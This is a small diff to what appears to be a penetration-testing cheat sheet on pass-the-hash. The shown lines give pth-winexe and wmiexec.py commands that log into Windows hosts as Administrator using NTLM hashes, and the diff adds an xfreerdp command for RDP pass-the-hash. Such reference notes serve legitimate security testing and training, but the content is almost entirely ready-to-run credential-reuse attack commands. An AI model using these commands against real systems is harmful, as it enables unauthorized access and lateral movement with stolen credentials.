@@ -203,6 +203,9 @@ $ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:08df31234567890bf
 # Method 2
 $ python wmiexec.py Administrator@[target] -hashes [LM]:[NT/NTLM]
 $ python wmiexec.py Administrator@10.11.1.22 -hashes [leavebankifnoLM]:ee12345067801f38115019ca2fb
+
+# Method 3 - RDP PTH
+$ xfreerdp /u:Administrator /pth:[NTLM hash] /d:[domain] /v:[target]
 ```
 
 Overpass-the-Hash
